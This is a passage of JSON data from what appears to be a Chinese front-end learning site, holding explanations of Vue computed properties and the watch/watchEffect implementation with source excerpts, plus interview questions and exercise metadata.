提供的一个非常强大和灵活的特性，它可以帮助我们简化数据处理的逻辑，并提高应用程序的性能。合理地使用计算属性，可以使我们的代码更加清晰、易于维护，并提供更好的用户体验。",
    "testPoint": "### **1. 基础知识**\n#### **问题**：\n- 什么是计算属性？和普通的方法调用有何不同？\n- 计算属性的基本语法是怎样的？\n\n#### **考察点**：\n- **定义**：\n  - 计算属性是基于其依赖的数据进行缓存的，只有依赖的数据发生变化时才会重新计算。\n- **基本语法**：\n  - 在 `computed` 对象中定义：\n    ```javascript\n    computed: {\n      fullName() {\n        return this.firstName + ' ' + this.lastName;\n      }\n    }\n    ```\n\n---\n\n### **2. 计算属性与方法**\n#### **问题**：\n- 计算属性和方法（`methods`）的区别是什么？\n- 如果一个功能可以使用计算属性和方法实现，应该如何选择？\n\n#### **考察点**：\n- **区别**：\n  - **计算属性**：结果会基于依赖的变化进行缓存，多次访问时不会重复计算。\n  - **方法**：每次调用都会重新执行逻辑，不会缓存结果。\n- **选择**：\n  - 如果逻辑较复杂且结果需要频繁访问，推荐使用计算属性。\n  - 如果逻辑不需要缓存，或者结果需要动态变化（如每次随机生成一个值），则使用方法。\n\n---\n\n### **3. 计算属性与侦听器**\n#### **问题**：\n- 计算属性和侦听器（`watch`）的区别是什么？\n- 在什么情况下应该使用计算属性而不是侦听器？\n\n#### **考察点**：\n- **区别**：\n  - **计算属性**：用于声明式地派生出新的值。\n  - **侦听器**：更适合响应特定数据变化后执行副作用逻辑。\n- **选择**：\n  - 如果仅需返回新的值，使用计算属性。\n  - 如果需要在数据变化时执行复杂的副作用逻辑，使用侦听器。\n\n---\n\n### **4. 计算属性的缓存**\n#### **问题**：\n- 为什么计算属性有缓存？它是如何工作的？\n- 是否可以禁用计算属性的缓存？\n\n#### **考察点**：\n- **缓存的实现**：\n  - Vue 的依赖追踪系统会检测计算属性中用到的响应式数据，当数据未发生变化时，返回缓存的结果。\n- **禁用缓存**：\n  - 计算属性本身不支持禁用缓存，想实现实时计算效果，可以使用方法。\n\n---\n\n### **5. 计算属性的 get 和 set**\n#### **问题**：\n- 如何为计算属性定义 `getter` 和 `setter`？\n- 给一个例子说明如何用计算属性实现双向绑定。\n\n#### **考察点**：\n- **getter 和 setter**：\n  - `getter`：定义计算属性的读取逻辑。\n  - `setter`：定义计算属性的写入逻辑。\n  - 示例：\n    ```javascript\n    computed: {\n      fullName: {\n        get() {\n          return this.firstName + ' ' + this.lastName;\n        },\n        set(value) {\n          const names = value.split(' ');\n          this.firstName = names[0];\n          this.lastName = names[1];\n        }\n      }\n    }\n    ```\n- **双向绑定**：\n  - 在使用 `v-model` 时，可以结合 `setter` 实现双向绑定。\n\n---\n\n### **6. 响应式依赖**\n#### **问题**：\n- 计算属性的依赖是如何追踪的？\n- 如果计算属性依赖的数据是嵌套的对象，如何确保其变化能被捕捉到？\n\n#### **考察点**：\n- **依赖追踪**：\n  - Vue 在计算属性首次访问时，记录依赖的响应式数据。\n- **嵌套对象**：\n  - 对于嵌套的对象属性，确保其也是响应式的（如通过 `Vue.set` 或 `ref` 定义）。\n\n---\n\n### **7. 计算属性的性能优化**\n#### **问题**：\n- 计算属性是否会影响性能？如何优化？\n- 如果一个计算属性依赖的数据过多，是否有更好的实现方式？\n\n#### **考察点**：\n- **性能问题**：\n  - 当依赖的数据频繁变化或计算逻辑复杂时，可能会导致性能问题。\n- **优化建议**：\n  - 简化计算逻辑。\n  - 合理设计依赖的数据结构。\n  - 对性能要求极高的场景，考虑使用缓存策略或 `watch` 配合自定义逻辑。\n\n---\n\n### **8. 计算属性的实践场景**\n#### **问题**：\n- 在项目中，计算属性通常用于哪些场景？\n- 是否有遇到过计算属性的性能问题？是如何解决的？\n\n#### **考察点**：\n- **常见应用**：\n  - 数据格式化：如时间、货币格式化。\n  - 动态显示逻辑：如按钮状态、表单校验结果。\n  - 复杂数据派生：如过滤或排序列表。\n- **性能问题解决**：\n  - 优化依赖。\n  - 使用分解逻辑的多个计算属性代替复杂的大型计算属性。\n\n---\n\n### **开放性问题**\n- 如果需要在一个页面中使用大量的计算属性，你会如何组织代码以保证可维护性？\n- 你认为计算属性的优点和局限性是什么？\n\n---\n\n### **总结**\n通过对 Vue 计算属性的全面考察，可以了解候选人是否能充分利用 Vue 的响应式系统进行高效开发。优秀的候选人能够在基础理论、场景应用和性能优化等方面都展现出清晰的思路和实践能力。",
    "exerciseKeyList": "[\"b5d40614-89d3-42c7-823a-2102ef8006b1\",\"ca2af24f-1516-4fd7-b979-e2f1d09ccb20\",\"f8de3a13-fb8b-44fd-9a8c-460a36998902\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:40:01.000Z",
    "updateAt": "2024-12-15T11:27:35.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "b5d40614-89d3-42c7-823a-2102ef8006b1",
        "title": "computed 计算值为什么还可以依赖另外一个 computed 计算值？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:35:25.000Z",
        "updateAt": "2024-08-10T19:07:04.000Z"
      },
      {
        "exerciseKey": "ca2af24f-1516-4fd7-b979-e2f1d09ccb20",
        "title": "computed怎么实现的缓存",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-20T15:13:58.000Z",
        "updateAt": "2024-08-10T17:06:21.000Z"
      },
      {
        "exerciseKey": "f8de3a13-fb8b-44fd-9a8c-460a36998902",
        "title": "​vue中computed和watch区别 ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-20T15:13:22.000Z",
        "updateAt": "2024-08-10T17:06:20.000Z"
      }
    ]
  },
  "68": {
    "id": 68,
    "tagId": 14,
    "title": "侦听器watch",
    "explanation": "一、 watch API\n------------\n\n我们先看看 watch的使用例子,watch 有多种用法，可以接收多种类型参数:\n\n```javascript\nimport { reactive, watch } from 'vue'\n\n// 1. 传入getter函数\nconst state = reactive({ count: 0 }) \nwatch(() => state.count, (count, prevCount) => { \n  // 当 state.count 更新，会触发此回调函数 \n}) \n\n// 2. 传入reactive对象\nwatch(state, (count, prevCount) => { \n  // 当 state.count 更新，会触发此回调函数 \n}) \n\n// 3. 传入ref对象\nconst stateRef = ref(0) \nwatch(stateRef, (count, prevCount) => { \n  // 当 stateRef.value 更新，会触发此回调函数 \n}) \n\n// 4.监听多个数据源，回调函数接受两个数组，分别对应来源数组中的新值和旧值：\nwatch([fooRef, barRef], ([foo, bar], [prevFoo, prevBar]) => { /* ... */ })\n\n```\n\n从上面的例子可以看到，对于 watch，它能接收的第一个参数类型非常多。\n\n你可以传入一个ref对象、一个响应式对象、一个 getter 函数、甚至是一个数组。\n\n我们在上一篇中知道了`computed对象`其内部是借助了 `effect函数` 创建了一个 `reactiveEffect函数`，在访问`computed对象`的值时，执行其 `runner函数` 求值。\n\n对于`watch`来说，其实它的内部也是借助了`effect函数`来实现，下面请看源码：\n\n```javascript\nfunction watch(source, cb, options) { \n  if ((process.env.NODE_ENV !== 'production') && !isFunction(cb)) { \n    warn(`\\`watch(fn, options?)\\` signature has been moved to a separate API. ` + \n      `Use \\`watchEffect(fn, options?)\\` instead. \\`watch\\` now only ` + \n      `supports \\`watch(source, cb, options?) signature.`) \n  } \n  return doWatch(source, cb, options) \n}\n\n\n```\n\n可以看到，watch方法里就是调用 `doWatch函数`，核心逻辑都藏在`doWtach` 函数里面。我们继续查 `doWatch` 的逻辑\n\n### 1\\. 处理参数\n\n```javascript\n\nfunction doWatch(source, cb, { immediate, deep, flush, onTrack, onTrigger } = EMPTY_OBJ) { \n  \n  // 当前组件实例 \nconst instance = currentInstance \nlet getter \nif (isArray(source)) { \n  getter = () => source.map(s => { \n    if (isRef(s)) { \n      return s.value \n    } \n    else if (isReactive(s)) { \n      return traverse(s) \n    } \n    else if (isFunction(s)) { \n      return callWithErrorHandling(s, instance, 2 /* WATCH_GETTER */) \n    } \n    else { \n      (process.env.NODE_ENV !== 'production') && warnInvalidSource(s) \n    } \n  }) \n} \nelse if (isRef(source)) { \n  getter = () => source.value \n} \nelse if (isReactive(source)) { \n  getter = () => source \n  deep = true \n} \nelse if (isFunction(source)) { \n  if (cb) { \n    // getter with cb \n    getter = () => callWithErrorHandling(source, instance, 2 /* WATCH_GETTER */) \n  } \n  else { \n    // watchEffect 的逻辑 \n  } \n} \nelse { \n  getter = NOOP \n  (process.env.NODE_ENV !== 'production') && warnInvalidSource(source) \n} \nif (cb && deep) { \n  const baseGetter = getter \n  getter = () => traverse(baseGetter()) \n} \n  \n  \n  //...\n }\n\n```\n\n在开头的使用例子中,我们知道watch 第一个参数可以接受不同数据类型的数据，所以`doWatch`函数里首先会对传进来的第一个函数`source`进行格式处理。\n\n1.  如果 source 是 `ref` 对象，创建一个访问 `source.value` 的 `getter` 函数;\n    \n2.  如果 source 是 `reactive` 对象， 则创建一个访问 `source` 的 `getter` 函数，并设置`deep`为 `true`。（watch默认开启了深层侦听）\n    \n3.  如果 source 是 一个`函数`：判断第二个参数`cb`，也就是回调函数是否存在\n    \n    （1）如果 **存在**，对其进行简单的封装后赋值给getter函数\n    \n    （2）如果 **不存在**，相当于是和`watchEffect`一样的调用逻辑。 对于 `watchEffect`的处理分支，我们后面再了解。\n    \n4.  如果 source 是一个`数组`，则会循环数组中的元素对数据类型进行判断。\n    \n5.  如果 source 都不满足条件，则会在非生产环境下打印警告。\n    \n\n> 在处理完参数以后，`getter` 变量就会变成一个标准的 `getter` 函数，这个`getter` 函数会返回一个响应式对象。在后续通过内置的 `effect` 函数创建 `runner` 副作用函数时，执行 `runner`函数也就是执行 `getter`函数进行求值，`getter`函数返回的响应式对象就是`watcher`求值的结果。\n\n6.  如果 `回调函数cb`存在且 `deep` 为`true`的情况下，会将 `getter`函数的结果，也就是返回的响应式对象进行循环遍历，递归地去访问这个响应式对象的每一个子属性。\n    \n7.  我们都知道，收集依赖的前提是访问了对象属性。只有收集了依赖后去修改属性，才会通知对应的依赖更新。所以这里递归访问对象的子属性，就是为了**收集依赖**，收集的依赖就是这个 `watch`内部 的`runner`函数\n    \n\n```javascript\nfunction traverse(value: unknown, seen: Set<unknown> = new Set()) {\n  if (!isObject(value) || seen.has(value)) {\n    return value\n  }\n  seen.add(value)\n  if (isArray(value)) {\n    for (let i = 0; i < value.length; i++) {\n      traverse(value[i], seen)\n    }\n  } else if (value instanceof Map) {\n    value.forEach((v, key) => {\n      // to register mutation dep for existing keys\n      traverse(value.get(key), seen)\n    })\n  } else if (value instanceof Set) {\n    value.forEach(v => {\n      traverse(v, seen)\n    })\n  } else {\n    for (const key in value) {\n      traverse(value[key], seen)\n    }\n  }\n  return value\n}\n\n```\n\n谈到递归，我们很容易会想到性能问题。没错，假如侦听的这个响应式对象非常复杂， 层级非常深，那么递归去执行`traverse` 函数会产生一定的性能问题。为了避免出现性能损耗，最好是可以明确地表示侦听的属性：\n\n```javascript\nwatch(() => state.count.a.b, (newVal, oldVal) => { \n  console.log(newVal) \n}) \nstate.count.a.b = 2 \n\n```\n\n### 2\\. 处理回调函数\n\n`watch`的第二个参数是在发生变化时要调用的`回调函数cb`。这个回调函数接受三个参数：`新值newVal`、`旧值oldVal`，以及一个用于注册副作用清理的回调函数 **~onInvalidate~** 。\n\n> 注意： `vue3.4`以及最新版本中已经删除 onInvalidate 这一参数,所以你可以忽略。该回调函数会在副作用下一次重新执行前调用，可以用来清除无效的副作用，例如等待中的异步请求。\n\n```javascript\nlet cleanup \n// 注册无效回调函数 \nconst onInvalidate = (fn) => { \n  cleanup = runner.options.onStop = () => { \n    callWithErrorHandling(fn, instance, 4 /* WATCH_CLEANUP */) \n  } \n} \n// 旧值初始值 \nlet oldValue = isArray(source) ? [] : INITIAL_WATCHER_VALUE /*{}*/ \n// 回调函数 \nconst applyCb = cb \n  ? () => { \n    // 组件销毁，则直接返回 \n    if (instance && instance.isUnmounted) { \n      return \n    } \n    // 求得新值 \n    const newValue = runner() \n    if (deep || hasChanged(newValue, oldValue)) { \n      // 执行清理函数 \n      if (cleanup) { \n        cleanup() \n      } \n      callWithAsyncErrorHandling(cb, instance, 3 /* WATCH_CALLBACK */, [ \n        newValue, \n        // 第一次更改时传递旧值为 undefined \n        oldValue === INITIAL_WATCHER_VALUE ? undefined : oldValue, \n        onInvalidate \n      ]) \n      // 更新旧值 \n      oldValue = newValue \n    } \n  } \n  : void 0 \n  \n const runner = effect(getter, {\n    lazy: true,\n    // so it runs before component update effects in pre flush mode\n    computed: true,\n    onTrack,\n    onTrigger,\n    scheduler: applyCb ? () => scheduler(applyCb) : scheduler\n  })\n\n\n```\n\n1.  首先会创建一个 `onInvalidate` 函数用来注册无效回调函数，现在你先不用管这个逻辑，因为它已经在最新版本中被删除了。\n2.  接着定义了初始的`value`值，如果监听的`source`是一个数组，初始`oldValue`就是空数组`[]`,否则就为空对象`{}`。\n3.  如果有传入`cb回调函数`，那么就会重新构建一个`回调函数applyCb`，在侦听的`source`发生改变时执行`applyCb`的逻辑。\n4.  在`applyCb`里面首先会判断如果此时组件已经销毁，那么直接结束，不作任何处理\n5.  执行`runner`函数，获得新值`newValue`。执行这个`runner`函数其实就是执行`getter`函数获取新值\n6.  最后进行判断，如果是 `deep` 的情况或者新旧值发生了变化，则执行回调函数 `cb`，传入参数 `newValue` 和 `oldValue`。\n\n> 注意，第一次执行的时候旧值的初始值是空数组或者 undefined。执行完回调函数 cb 后，把旧值 oldValue 再更新为 newValue，这是为了下一次的比对\n\n### 3\\. 处理调度执行\n\n`watch`接收的第三个可选的参数是一个对象，支持以下这些选项：\n\n*   **`immediate`**：在侦听器创建时立即触发回调。第一次调用时旧值是 `undefined`。\n*   **`deep`**：如果源是对象，强制深度遍历，以便在深层级变更时触发回调。参考[深层侦听器](https://cn.vuejs.org/guide/essentials/watchers.html#deep-watchers)。\n*   **`flush`**：调整回调函数的刷新时机。参考[回调的刷新时机](https://cn.vuejs.org/guide/essentials/watchers.html#callback-flush-timing)及 [`watchEffect()`](https://cn.vuejs.org/api/reactivity-core.html#watcheffect)。\n\n这里我们重点关注 `flush`这个配置值，因为不同的 `flush` 决定了 `watcher` 的执行时机。\n\n```javascript\nconst invoke = (fn) => fn() \nlet scheduler \nif (flush === 'sync') { \n  // 同步 \n  scheduler = invoke \n} \nelse if (flush === 'pre') { \n  scheduler = job => { \n    if (!instance || instance.isMounted) { \n      // 进入异步队列，组件更新前执行 \n      queueJob(job) \n    } \n    else { \n      // 如果组件还没挂载，则同步执行确保在组件挂载前 \n      job() \n    } \n  } \n} \nelse { \n  // 进入异步队列，组件更新后执行 \n  scheduler = job => queuePostRenderEffect(job, instance && instance.suspense) \n} \n\n```\n\n 如果在创建`effect`时，配置了scheduler属性，那么在数据的依赖触发时，也就是执行`trigger`函数中的`run`方法时，并不会直接执行副作用函数，而是执行`scheduler`方法，这就相当于将控制权交了出去。\n\n而传入不同`flush`值，也就会有不同`scheduler`函数，从而实现不同的调度方式，也就是决定了`watcher` 的 执行时机。\n\n1.  当 `flush` 为 `sync` 的时候，表示它是一个同步 `watcher`，即当数据变化时同步执行回调函数。\n    \n2.  当 `flush` 为 `pre` 的时候，回调函数通过 `queueJob` 的方式在组件更新之前执行，如果组件还没挂载，则同步执行确保回调函数在组件挂载之前执行。\n    \n3.  如果没设置 `flush` 或者 `flus`h为 `post`，那么回调函数通过 `queuePostRenderEffect` 的方式在组件更新之后执行。\n    \n\n> queueJob 和 queuePostRenderEffect 在这里不是重点，所以我们放到后面介绍。总之，你现在要记住，**watcher 的回调函数是通过一定的调度方式执行的。**\n\n### 4\\. 创建effect函数\n\n接下来就是`watch`实现的核心逻辑了\n\n```javascript\nconst runner = effect(getter, { \n  // 延时执行 \n  lazy: true, \n  // computed effect 可以优先于普通的 effect 先运行，比如组件渲染的 effect \n  computed: true, \n  onTrack, \n  onTrigger, \n  scheduler: applyCb ? () => scheduler(applyCb) : scheduler \n}) \n// 在组件实例中记录这个 effect \nrecordInstanceBoundEffect(runner) \n// 初次执行 \nif (applyCb) { \n  if (immediate) { \n    applyCb() \n  } \n  else { \n    // 求旧值 \n    oldValue = runner() \n  } \n} \nelse { \n  // 没有 cb 的情况 \n  runner() \n} \n\n\n```\n\n1.  通过内置的`effect`函数创建副作用函数`runner`\n2.  和`computed对象`一样，在创建的时候配置对象`options`中的`computed`为`true`，表示这是一个`computed effect`，在数据改变，触发依赖更新时执行`trigger函数`，**会优先执行**。\n3.  除了`computed`为`true`，`laz`y也为`true`，`runner`就不会在创建之后马上执行。\n4.  执行`runner`函数相当于执行`getter`函数，就会访问响应式数据并开依赖收集。\n5.  第一次执行`runner`得到的值就是oldValue。\n6.  如果配置了`immediate` 为`true`，在创建`watch`的时候就会立刻执行`applyCb函数`，`applyCb函数`里会执行`runner函数`，也会进行依赖收集。\n\n### 5.返回 watch的销毁函数\n\n`watch`还会有一个返回值，这个返回值是一个函数，你可以使用它来销毁侦听器。\n\n```javascript\n\nconst unwatch = watch(() => {}) // ...当该侦听器不再需要时 \nunwatch();\n\n\n```\n\n那么问题来了，什么时候会出现需要手动销毁侦听器的场景呢？\n\n答案是在异步创建侦听器的时候。\n\n> 在 `setup()` 或 `<script setup>` 中用同步语句创建的侦听器，会自动绑定到宿主组件实例上，并且会在宿主组件卸载时自动停止。因此，在大多数情况下，你无需关心怎么停止一个侦听器。\n\n> 一个关键点是，侦听器必须用**同步**语句创建：如果用异步回调创建一个侦听器，那么它不会绑定到当前组件上，你必须手动停止它，以防内存泄漏。如下方这个例子：\n\n```javascript\n<script setup>\nimport { watchEffect } from 'vue'\n\n// 它会自动停止\nwatchEffect(() => {})\n\n// ...这个则不会！\nsetTimeout(() => {\n  watchEffect(() => {})\n}, 100)\n</script>\n\n```\n\n至于是如何实现的就比较简单了，我们来看下源码：\n\n```javascript\nreturn () => { \n  stop(runner) \n  if (instance) { \n    // 移除组件 effects 对这个 runner 的引用 \n    remove(instance.effects, runner) \n  } \n} \nfunction stop(effect) { \n  if (effect.active) { \n    cleanup(effect) \n    if (effect.options.onStop) { \n      effect.options.onStop() \n    } \n    effect.active = false \n  } \n} \n\n```\n\n1.  当手动调用`unwatch`的时候，会执行`stop`方法来让`runner`失效\n2.  `runner`函数里会调用`cleanup`方法清理\\`runner\\`\\`的相关依赖\n\n二、watch的执行时机\n------------\n\n### 1\\. 同步执行 sync\n\n```javascript\n    const state = reactive({\n        count: 0,\n      })\n      watch(\n        () => state.count,\n        (newValue, oldValue) => {\n          console.log(newValue, oldValue)\n        },\n        { flush: 'sync' },\n      )\n      const toggle = function () {\n        state.count++\n        state.count++\n        state.count++\n      }\n      \n      // 1 0\n      // 2 1\n      // 3 2 \n\n```\n\n如果传入的flush值是sync，也就是同步执行，那么数据改变三次，也会打印三次；\n\n### 2\\. flush为 pre 或者不传值\n\n```javascript\n    const state = reactive({\n        count: 0,\n      })\n      watch(\n        () => state.count,\n        (newValue, oldValue) => {\n          console.log(newValue, oldValue)\n        },\n        { flush: 'pre' },\n      )\n      const toggle = function () {\n        state.count++\n        state.count++\n        state.count++\n      }\n      \n      // 3 0 \n\n```\n\n无论`state.count` 改变多少次，回调函数只会执行一次，也就是只打印一次。\n\n```javascript\n let scheduler: (job: () => any) => void\n  if (flush === 'sync') {\n    scheduler = invoke\n  } else if (flush === 'pre') {\n    scheduler = job => {\n      if (!instance || instance.isMounted) {\n        queueJob(job)\n      } else {\n        // with 'pre' option, the first call must happen before\n        // the component is mounted so it is called synchronously.\n        job()\n      }\n    }\n  } else {\n    scheduler = job => queuePostRenderEffect(job, instance && instance.suspense)\n  }\n\n```\n\n可以看到，如果`flush`传值为`pre`或者不传值。分别使用`queueJob`方法和`queuePostRenderEffect`方法来实现。 而对于`queuePostRenderEffect`来说，在不考虑`SUSPENSE`的情况下，就是调用的`queuePostFlushCb`方法来实现：\n\n```javascript\nexport const queuePostRenderEffect = __FEATURE_SUSPENSE__\n  ? queueEffectWithSuspense\n  : queuePostFlushCb\n\n```\n\n所以我们来看看`queueJob`方法和`queuePostFlushCb`方法：\n\n```javascript\n// 异步任务队列 \nconst queue = [] \n// 队列任务执行完后执行的回调函数队列 \nconst postFlushCbs = [] \nfunction queueJob(job) { \n  if (!queue.includes(job)) { \n    queue.push(job) \n    queueFlush() \n  } \n} \nfunction queuePostFlushCb(cb) { \n  if (!isArray(cb)) { \n    postFlushCbs.push(cb) \n  } \n  else { \n    // 如果是数组，把它拍平成一维 \n    postFlushCbs.push(...cb) \n  } \n  queueFlush() \n} \n\n```\n\nVue.js 内部维护了一个 `queue` 数组和一个`postFlushCbs`数组，其中 queue 数组用作异步任务队列， `postFlushCbs` 数组用作异步任务队列执行完毕后的回调函数队列。\n\n执行`queueJob`时会把这个任务 `job` 添加到 `queue` 的队尾，而执行`queuePostFlushCb`时，会把这个 `cb 回调函数`添加到 `postFlushCbs` 的队尾。它们在添加完毕后都执行了 `queueFlush 函数`，我们接着看它的实现：\n\n#### （1）核心逻辑：queueFlush 函数\n\n```javascript\nconst p = Promise.resolve() \n// 异步任务队列是否正在执行 \nlet isFlushing = false \n// 异步任务队列是否等待执行 \nlet isFlushPending = false \nfunction nextTick(fn) { \n  return fn ? p.then(fn) : p \n} \nfunction queueFlush() { \n  if (!isFlushing && !isFlushPending) { \n    isFlushPending = true \n    nextTick(flushJobs) \n  } \n} \n\n\n```\n\n可以看到，Vue.js 内部还维护了 `isFlushing` 和 `isFlushPending` 变量，用来控制异步任务的刷新逻辑。\n\n在`queueFlush`首次执行时，`isFlushing` 和 `isFlushPending` 都是 `false`，此时会把 `isFlushPending` 设置为 `true`，并且调用 `nextTick(flushJobs)` 去执行队列里的任务。\n\n因为 `isFlushPending` 的控制，这使得即使多次执行 `queueFlush`，也不会多次去执行 `flushJobs`。另外 `nextTick` 在 Vue.js 3.0 中的实现也是非常简单，通过 `Promise.resolve().then` 去异步执行 `flushJobs`。\n\n因为 JavaScript 是单线程执行的，这样的异步设计使你在一个 Tick 内，可以多次执行 `queueJob`或者 `queuePostFlushCb` 去添加任务，也可以保证在宏任务执行完毕后的微任务阶段执行一次 `flushJobs`。\n\n#### （2）执行异步任务队列\n\n接下来就是`flushJobs`的执行了：\n\n```javascript\nconst getId = (job) => (job.id == null ? Infinity : job.id) \nfunction flushJobs(seen) { \n  isFlushPending = false \n  isFlushing = true \n  let job \n  if ((process.env.NODE_ENV !== 'production')) { \n    seen = seen || new Map() \n  } \n  // 组件的更新是先父后子 \n  // 如果一个组件在父组件更新过程中卸载，它自身的更新应该被跳过 \n  queue.sort((a, b) => getId(a) - getId(b)) \n  while ((job = queue.shift()) !== undefined) { \n    if (job === null) { \n      continue \n    } \n    if ((process.env.NODE_ENV !== 'production')) { \n      checkRecursiveUpdates(seen, job) \n    } \n    callWithErrorHandling(job, null, 14 /* SCHEDULER */) \n  } \n  flushPostFlushCbs(seen) \n  isFlushing = false \n  // 一些 postFlushCb 执行过程中会再次添加异步任务，递归 flushJobs 会把它们都执行完毕 \n  if (queue.length || postFlushCbs.length) { \n    flushJobs(seen) \n  } \n} \n\n\n```\n\n1.  把 `isFlushPending` 重置为 `false`，把 `isFlushing` 设置为 `true` 来表示正在执行异步任务队列\n2.  将队列由小到大排序，由于父组件的 `effect id` 比子组件`effect id`小，所以父组件在前，子组件在后。所以就是先更新父组件，再更新子组件，这是符合逻辑的。\n3.  这样做还有一个好处就是，如果一个子组件在父组件更新过程中被卸载了，不存在了，那么就可以调到它自身的更新。\n4.  最后遍历`queue`，**`checkRecursiveUpdates` 方面是为了处理死循环的情况，当循环次数大于 100 次时，`vue`会抛出错误**。\n5.  执行`flushPostFlushCbs`中的回调函数\n\n三、watchEffect API\n-----------------\n\n### 1\\. 使用案例\n\n`watchEffect`的作用是立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行。\n\n```javascript\nconst count = ref(0)\n\nwatchEffect(() => console.log(count.value))\n// -> 输出 0\n\ncount.value++\n// -> 输出 1\n\n```\n\n### 2.使用场景\n\n假设这样一个场景：每当 `todoId` 的引用发生变化时使用侦听器来加载一个远程资源：\n\n```javascript\nconst todoId = ref(1)\nconst data = ref(null)\n\nwatch(\n  todoId,\n  async () => {\n    const response = await fetch(\n      `https://jsonplaceholder.typicode.com/todos/${todoId.value}`\n    )\n    data.value = await response.json()\n  },\n  { immediate: true }\n)\n\n```\n\n在这个例子中watch使用了两次`todoId`,一次是作为源，另一次是在回调中。\n\n我们可以用 [`watchEffect`](https://cn.vuejs.org/api/reactivity-core.html#watcheffect) 来简化上面的代码。`watchEffect()` 允许我们自动跟踪回调的响应式依赖。上面的侦听器可以重写为：\n\n```javascript\nwatchEffect(async () => {\n  const response = await fetch(\n    `https://jsonplaceholder.typicode.com/todos/${todoId.value}`\n  )\n  data.value = await response.json()\n})\n\n```\n\n这个例子中，回调会立即执行，不需要指定 `immediate: true`。在执行期间，它会自动追踪 `todoId.value` 作为依赖（和计算属性类似）。每当 `todoId.value` 变化时，回调会再次执行。有了 `watchEffect()`，我们不再需要明确传递 `todoId` 作为源值。\n\n对于这种只有一个依赖项的例子来说，`watchEffect()` 的好处相对较小。但是对于有多个依赖项的侦听器来说，使用 `watchEffect()` 可以消除手动维护依赖列表的负担。此外，如果你需要侦听一个嵌套数据结构中的几个属性，`watchEffect()` 可能会比深度侦听器更有效，因为它将只跟踪回调中被使用到的属性，而不是递归地跟踪所有的属性。\n\n### 3.与watch的差异之处\n\n*   侦听的源不同 。`watch API` 可以侦听一个或多个响应式对象，也可以侦听一个 `getter` 函数，而 `watchEffect API` 侦听的是一个普通函数，只要内部访问了响应式对象即可，这个函数并不需要返回响应式对象。\n    \n*   没有回调函数 。`watchEffect API` 没有回调函数，副作用函数的内部响应式对象发生变化后，会再次执行这个副作用函数。\n    \n*   立即执行 。`watchEffect API` 在创建好 `watcher` 后，会立刻执行它的副作用函数，而 `watch API` 需要配置 `immediate` 为 `true`，才会立即执行回调函数。\n    \n\n### 4\\. 实现原理\n\n`watchEffect`的实现其实也是通过调用`doWatch`方法，跟`watch`不同的是，第一个参数传入的是`getter`函数，第二个参数`回调函数cb` 为 `null`。\n\n```javascript\nexport function watchEffect(\n  effect: WatchEffect,\n  options?: WatchOptionsBase\n): WatchStopHandle {\n  return doWatch(effect, null, options)\n}\n\n```\n\n进入到`doWtach`的方法里，首先对 `getter`函数进行简单封装，`watchEffect` 内部创建的 `runner` 对应的 `scheduler` 对象就是 `scheduler` 函数本身，这样它再次执行时，就会执行这个`scheduler`函数，并且传入 `runner 函数`作为参数，其实就是按照一定的调度方式去执行基于`source`封装的 `getter 函数`。\n\n创建完 `runner` 后就立刻执行了 `runner`，其实就是内部同步执行了基于 `source` 封装的 `getter 函数`。\n\n再具体的流程我们这里就不再继续一一分析了。\n\n### 总结\n\n本篇文章我们学习了`watch`和`watchEffect`的使用方法以及实现原理。其中，`watch` 的内部是如何进行调度执行是我们值得花时间去弄懂的知识点。\n\n相比于计算属性，侦听器更适合用于在数据变化后执行某段逻辑的场景，而计算属性则用于一个数据依赖另外一些数据计算而来的场景。\n\n  \n",
    "testPoint": "### **1. 基础知识**\n#### **问题**：\n- `watch` 是什么？它的基本作用是什么？\n- 使用 `watch` 的语法和基本结构是什么？\n\n#### **考察点**：\n- **定义**：\n  - `watch` 是 Vue 提供的一个监听器，用于监听响应式数据的变化，并在变化时执行指定的回调函数。\n- **基本语法**：\n  - 简单监听：\n    ```javascript\n    watch: {\n      message(newVal, oldVal) {\n        console.log(`Message changed from ${oldVal} to ${newVal}`);\n      }\n    }\n    ```\n  - 深度监听：\n    ```javascript\n    watch: {\n      data: {\n        handler(newVal) {\n          console.log('Data changed:', newVal);\n        },\n        deep: true\n      }\n    }\n    ```\n\n---\n\n### **2. `watch` 和 `computed` 的区别**\n#### **问题**：\n- `watch` 和计算属性（`computed`）的区别是什么？各自适用于什么场景？\n- 是否可以用 `watch` 替代 `computed`，或者反之？\n\n#### **考察点**：\n- **区别**：\n  - **`computed`**：声明式地计算新值，并缓存结果；适合派生出新的数据。\n  - **`watch`**：命令式地监听数据变化并执行副作用逻辑。\n- **适用场景**：\n  - 如果只是处理数据并生成新值，优先使用 `computed`。\n  - 如果需要执行异步任务或副作用逻辑（如 API 请求、计时器），适合使用 `watch`。\n\n---\n\n### **3. 深度监听（Deep Watch）**\n#### **问题**：\n- 如何监听嵌套对象或数组的变化？\n- 深度监听可能带来哪些性能问题？如何避免？\n\n#### **考察点**：\n- **深度监听的语法**：\n  - 设置 `deep: true`：\n    ```javascript\n    watch: {\n      nestedObject: {\n        handler(newVal) {\n          console.log('Nested object changed:', newVal);\n        },\n        deep: true\n      }\n    }\n    ```\n- **性能问题**：\n  - 深度监听会递归遍历对象的每个属性，监听所有层级的变化，可能导致性能开销。\n- **优化建议**：\n  - 根据具体需求设计监听逻辑，避免不必要的深度监听。\n  - 在特定场景下，使用手动监听某些属性的方式替代深度监听。\n\n---\n\n### **4. Immediate 属性**\n#### **问题**：\n- `immediate` 属性的作用是什么？\n- 在什么场景下需要使用 `immediate`？\n\n#### **考察点**：\n- **定义**：\n  - `immediate: true` 可以在监听器初始化时立即触发回调。\n  - 示例：\n    ```javascript\n    watch: {\n      data: {\n        handler(newVal) {\n          console.log('Data:', newVal);\n        },\n        immediate: true\n      }\n    }\n    ```\n- **使用场景**：\n  - 初始化阶段需要根据数据执行某些逻辑（如根据初始值发起请求或设置页面状态）。\n\n---\n\n### **5. 侦听多数据源**\n#### **问题**：\n- 如何侦听多个数据源的变化？\n- 在监听多个数据时，如何避免回调函数的复杂度？\n\n#### **考察点**：\n- **方法一：分开监听**：\n  - 为每个数据源设置单独的监听器：\n    ```javascript\n    watch: {\n      data1(newVal) {\n        console.log('Data1 changed:', newVal);\n      },\n      data2(newVal) {\n        